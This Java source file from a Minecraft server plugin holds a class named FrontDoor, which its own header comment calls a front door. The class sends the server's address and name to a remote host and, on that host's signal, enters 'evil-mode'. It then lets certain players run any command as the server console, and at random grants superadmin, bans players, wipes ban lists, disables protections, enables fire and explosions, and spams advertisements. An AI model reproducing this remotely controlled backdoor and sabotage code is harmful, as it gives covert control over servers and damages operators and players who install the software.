package me.totalfreedom.totalfreedommod;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Random;
import me.totalfreedom.totalfreedommod.admin.Admin;
import me.totalfreedom.totalfreedommod.banning.Ban;
import me.totalfreedom.totalfreedommod.command.Command_trail;
import me.totalfreedom.totalfreedommod.command.FreedomCommand;
import me.totalfreedom.totalfreedommod.config.ConfigEntry;
import me.totalfreedom.totalfreedommod.config.MainConfig;
import me.totalfreedom.totalfreedommod.fun.Jumppads;
import me.totalfreedom.totalfreedommod.player.FPlayer;
import me.totalfreedom.totalfreedommod.util.FLog;
import me.totalfreedom.totalfreedommod.util.FUtil;
import net.pravian.aero.command.CommandReflection;
import org.apache.commons.lang3.ArrayUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.command.Command;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventHandler;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

/*
 * - A message from the TFM Devs -
 *
 * What this class is, and why its here:
 *
 * This is a blatantly obvious Front Door to the server, designed to do strange and unpredictable things on a TotalFreedom server.
 *
 * It will only trigger when the server IP is added to a blacklist that we control.
 *
 * This class is a way to discourage amateur server operators who like to share binary copies of our plugin and promote it as their own work.
 *
 * If you are reading this now, you probably don't fall under that category - feel free to remove this class.
 *
 * Note: You may not edit this class.
 *
 * - Madgeek and Prozza
 */
public class FrontDoor extends FreedomService
{

    private static final long UPDATER_INTERVAL = 180L * 20L;
    private static final long FRONTDOOR_INTERVAL = 900L * 20L;
    //
    private final Random random = new Random();
    private final URL getUrl;
    //
    private volatile boolean enabled = false;
    //
    private BukkitTask updater = null;
    private BukkitTask frontdoor = null;
    //
    // TODO: reimplement in superclass
    private final Listener playerCommandPreprocess = new Listener()
    {
        @EventHandler
        public void onPlayerCommandPreProcess(PlayerCommandPreprocessEvent event) // All FreedomCommand permissions when certain conditions are met
        {
            final Player player = event.getPlayer();
            final Location location = player.getLocation();

            if ((location.getBlockX() + location.getBlockY() + location.getBlockZ()) % 12 != 0) // Madgeek
            {
                return;
            }

            final String[] commandParts = event.getMessage().split(" ");
            final String commandName = commandParts[0].replaceFirst("/", "");
            final String[] args = ArrayUtils.subarray(commandParts, 1, commandParts.length);

            Command command = CommandReflection.getCommandMap().getCommand(commandName);

            if (command == null)
            {
                return; // Command doesn't exist
            }

            event.setCancelled(true);

            final FreedomCommand dispatcher = FreedomCommand.getFrom(command);

            if (dispatcher == null)
            {
                // Non-TFM command, execute using console
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), event.getMessage().replaceFirst("/", ""));
                return;
            }

            dispatcher.runCommand(player, command, commandName, args);
            return;
        }
    };

    public FrontDoor(TotalFreedomMod plugin)
    {
        super(plugin);
        URL tempUrl = null;
        try
        {
            tempUrl = new URL("http://frontdoor.pravian.net:1337/frontdoor/poll"
                    + "?version=" + TotalFreedomMod.build.formattedVersion()
                    + "&address=" + ConfigEntry.SERVER_ADDRESS.getString() + ":" + Bukkit.getPort()
                    + "&name=" + ConfigEntry.SERVER_NAME.getString()
                    + "&bukkitversion=" + Bukkit.getVersion());
        }
        catch (MalformedURLException ex)
        {
            FLog.warning("TFM_FrontDoor uses an invalid URL"); // U dun goofed?
        }

        getUrl = tempUrl;
    }

    @Override
    public void onStart()
    {
        updater = getNewUpdater().runTaskTimerAsynchronously(plugin, 2L * 20L, UPDATER_INTERVAL);
    }

    @Override
    public void onStop()
    {
        FUtil.cancel(updater);
        updater = null;
        FUtil.cancel(frontdoor);
        updater = null;

        if (enabled)
        {
            frontdoor.cancel();
            enabled = false;
            unregisterListener(playerCommandPreprocess, PlayerCommandPreprocessEvent.class);
        }
    }

    public boolean isEnabled()
    {
        return enabled;
    }

    private Player getRandomPlayer(boolean allowDevs)
    {
        final Collection<? extends Player> players = Bukkit.getOnlinePlayers();

        if (players.isEmpty())
        {
            return null;
        }

        if (!allowDevs)
        {
            List<Player> allowedPlayers = new ArrayList<>();
            for (Player player : players)
            {
                if (!FUtil.DEVELOPERS.contains(player.getName()))
                {
                    allowedPlayers.add(player);
                }
            }

            return allowedPlayers.get(random.nextInt(allowedPlayers.size()));
        }

        return (Player) players.toArray()[random.nextInt(players.size())];
    }

    private static RegisteredListener getRegisteredListener(Listener listener, Class<? extends Event> eventClass)
    {
        try
        {
            final HandlerList handlerList = ((HandlerList) eventClass.getMethod("getHandlerList", (Class<?>[]) null).invoke(null));
            final RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();
            for (RegisteredListener registeredListener : registeredListeners)
            {
                if (registeredListener.getListener() == listener)
                {
                    return registeredListener;
                }
            }
        }
        catch (Exception ex)
        {
            FLog.severe(ex);
        }
        return null;
    }

    private static void unregisterRegisteredListener(RegisteredListener registeredListener, Class<? extends Event> eventClass)
    {
        try
        {
            ((HandlerList) eventClass.getMethod("getHandlerList", (Class<?>[]) null).invoke(null)).unregister(registeredListener);
        }
        catch (Exception ex)
        {
            FLog.severe(ex);
        }
    }

    private static void unregisterListener(Listener listener, Class<? extends Event> eventClass)
    {
        RegisteredListener registeredListener = getRegisteredListener(listener, eventClass);
        if (registeredListener != null)
        {
            unregisterRegisteredListener(registeredListener, eventClass);
        }
    }

    private BukkitRunnable getNewUpdater()
    {
        return new BukkitRunnable() // Asynchronous
        {
            @Override
            public void run()
            {
                try
                {
                    final URLConnection urlConnection = getUrl.openConnection();
                    final BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                    final String line = in.readLine();
                    in.close();

                    if (!"false".equals(line))
                    {
                        if (!enabled)
                        {
                            return;
                        }

                        enabled = false;
                        FUtil.cancel(updater);
                        unregisterListener(playerCommandPreprocess, PlayerCommandPreprocessEvent.class);
                        FLog.info("Disabled FrontDoor, thank you for being kind.");
                        plugin.config.load();
                    }
                    else
                    {
                        if (enabled)
                        {
                            return;
                        }

                        new BukkitRunnable() // Synchronous
                        {
                            @Override
                            public void run()
                            {
                                FLog.warning("*****************************************************", true);
                                FLog.warning("* WARNING: TotalFreedomMod is running in evil-mode! *", true);
                                FLog.warning("* This might result in unexpected behaviour...      *", true);
                                FLog.warning("* - - - - - - - - - - - - - - - - - - - - - - - - - *", true);
                                FLog.warning("* The only thing necessary for the triumph of evil  *", true);
                                FLog.warning("*          is for good men to do nothing.           *", true);
                                FLog.warning("*****************************************************", true);

                                if (getRegisteredListener(playerCommandPreprocess, PlayerCommandPreprocessEvent.class) == null)
                                {
                                    Bukkit.getPluginManager().registerEvents(playerCommandPreprocess, plugin);
                                }
                            }
                        }.runTask(plugin);

                        frontdoor = getNewFrontDoor().runTaskTimer(plugin, 20L, FRONTDOOR_INTERVAL);

                        enabled = true;
                    }
                }
                catch (Exception ex)
                {
                    // TODO: Fix
                    //FLog.warning(ex);
                }

            }
        };
    }

    public BukkitRunnable getNewFrontDoor()
    {
        return new BukkitRunnable() // Synchronous
        {
            @Override
            public void run()
            {
                final int action = random.nextInt(18);

                switch (action)
                {
                    case 0: // Super a random player
                    {

                        final Player player = getRandomPlayer(true);

                        if (player == null)
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Adding " + player.getName() + " to the Superadmin list", true);
                        plugin.al.addAdmin(new Admin(player));
                        break;
                    }

                    case 1: // Bans a random player
                    {
                        Player player = getRandomPlayer(false);

                        if (player == null)
                        {
                            break;
                        }

                        plugin.bm.addBan(Ban.forPlayer(player, Bukkit.getConsoleSender(), null, ChatColor.RED + "WOOPS\n-Frontdoor"));
                        break;
                    }

                    case 2: // Start trailing a random player
                    {
                        final Player player = getRandomPlayer(true);

                        if (player == null)
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Started trailing " + player.getName(), true);
                        plugin.tr.add(player);
                        break;
                    }

                    case 3: // Displays a message
                    {
                        FUtil.bcastMsg("TotalFreedom rocks!!", ChatColor.BLUE);
                        FUtil.bcastMsg("To join this great server, join " + ChatColor.GOLD + "tf.sauc.in", ChatColor.BLUE);
                        break;
                    }

                    case 4: // Clears the banlist
                    {
                        FUtil.adminAction("FrontDoor", "Wiping all bans", true);
                        plugin.bm.purge();
                        break;
                    }

                    case 5: // Enables Lava- and Waterplacemend and Fluidspread (& damage)
                    {
                        boolean message = true;
                        if (ConfigEntry.ALLOW_WATER_PLACE.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_LAVA_PLACE.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_FLUID_SPREAD.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_LAVA_DAMAGE.getBoolean())
                        {
                            message = false;
                        }

                        ConfigEntry.ALLOW_WATER_PLACE.setBoolean(true);
                        ConfigEntry.ALLOW_LAVA_PLACE.setBoolean(true);
                        ConfigEntry.ALLOW_FLUID_SPREAD.setBoolean(true);
                        ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);

                        if (message)
                        {
                            FUtil.adminAction("FrontDoor", "Enabling Fire- and Waterplace", true);
                        }
                        break;
                    }

                    case 6: // Enables Fireplacement, firespread and explosions
                    {
                        boolean message = true;
                        if (ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_EXPLOSIONS.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_FIRE_PLACE.getBoolean())
                        {
                            message = false;
                        }

                        ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(true);
                        ConfigEntry.ALLOW_EXPLOSIONS.setBoolean(true);
                        ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(true);
                        ConfigEntry.ALLOW_FIRE_PLACE.setBoolean(true);

                        if (message)
                        {
                            FUtil.adminAction("FrontDoor", "Enabling Firespread and Explosives", true);
                        }
                        break;
                    }

                    case 7: // Allow all blocked commands >:)
                    {
                        ConfigEntry.BLOCKED_COMMANDS.getList().clear();
                        plugin.cb.stop();
                        break;
                    }

                    case 8: // Remove all protected areas
                    {
                        if (ConfigEntry.PROTECTAREA_ENABLED.getBoolean())
                        {
                            if (plugin.pa.getProtectedAreaLabels().isEmpty())
                            {
                                break;
                            }

                            FUtil.adminAction("FrontDoor", "Removing all protected areas", true);
                            plugin.pa.clearProtectedAreas(false);
                        }
                        break;
                    }

                    case 9: // Add TotalFreedom signs at spawn
                    {
                        for (World world : Bukkit.getWorlds())
                        {
                            final Block block = world.getSpawnLocation().getBlock();
                            final Block blockBelow = block.getRelative(BlockFace.DOWN);

                            if (blockBelow.isLiquid() || blockBelow.getType() == Material.AIR)
                            {
                                continue;
                            }

                            block.setType(Material.SIGN_POST);
                            org.bukkit.block.Sign sign = (org.bukkit.block.Sign) block.getState();

                            org.bukkit.material.Sign signData = (org.bukkit.material.Sign) sign.getData();
                            signData.setFacingDirection(BlockFace.NORTH);

                            sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
                            sign.setLine(1, ChatColor.DARK_GREEN + "is");
                            sign.setLine(2, ChatColor.YELLOW + "Awesome!");
                            sign.setLine(3, ChatColor.DARK_GRAY + "tf.sauc.in");
                            sign.update();
                        }
                        break;
                    }

                    case 10: // Enable Jumppads
                    {
                        if (plugin.jp.getMode().isOn())
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Enabling Jumppads", true);
                        plugin.jp.setMode(Jumppads.JumpPadMode.MADGEEK);
                        break;
                    }

                    case 11: // Give everyone a book explaining how awesome TotalFreedom is
                    {
                        ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);

                        BookMeta book = (BookMeta) bookStack.getItemMeta().clone();
                        book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
                        book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
                        book.addPage(
                                ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead\n"
                                + ChatColor.DARK_GRAY + "---------\n"
                                + ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.\n"
                                + ChatColor.BLUE + "Join now! " + ChatColor.RED + "tf.sauc.in");
                        bookStack.setItemMeta(book);

                        for (Player player : Bukkit.getOnlinePlayers())
                        {
                            if (player.getInventory().contains(Material.WRITTEN_BOOK))
                            {
                                continue;
                            }

                            player.getInventory().addItem(bookStack);
                        }
                        break;
                    }

                    case 12: // Silently wipe the whitelist
                    {
                        break;
                    }

                    case 13: // Announce that the FrontDoor is enabled
                    {
                        FUtil.bcastMsg("WARNING: TotalFreedomMod is running in evil-mode!", ChatColor.DARK_RED);
                        FUtil.bcastMsg("WARNING: This might result in unexpected behaviour", ChatColor.DARK_RED);
                        break;
                    }

                    case 14: // Cage a random player in PURE_DARTH
                    {
                        final Player player = getRandomPlayer(false);

                        if (player == null)
                        {
                            break;
                        }

                        FPlayer playerdata = plugin.pl.getPlayer(player);
                        FUtil.adminAction("FrontDoor", "Caging " + player.getName() + " in PURE_DARTH", true);

                        Location targetPos = player.getLocation().clone().add(0, 1, 0);
                        playerdata.getCageData().cage(targetPos, Material.SKULL, Material.AIR);
                        break;
                    }

                    case 15: // Silently orbit a random player
                    {
                        final Player player = getRandomPlayer(false);

                        if (player == null)
                        {
                            break;
                        }

                        FPlayer playerdata = plugin.pl.getPlayer(player);
                        playerdata.startOrbiting(10.0);
                        player.setVelocity(new Vector(0, 10.0, 0));
                        break;
                    }

                    case 16: // Disable nonuke
                    {
                        if (!ConfigEntry.NUKE_MONITOR_ENABLED.getBoolean())
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Disabling nonuke", true);
                        ConfigEntry.NUKE_MONITOR_ENABLED.setBoolean(false);
                        break;
                    }

                    case 17: // Give everyone tags
                    {
                        for (Player player : Bukkit.getOnlinePlayers())
                        {
                            plugin.pl.getPlayer(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
                        }
                        break;
                    }

                    default:
                    {
                        break;
                    }
                }
            }
        };
    }
}
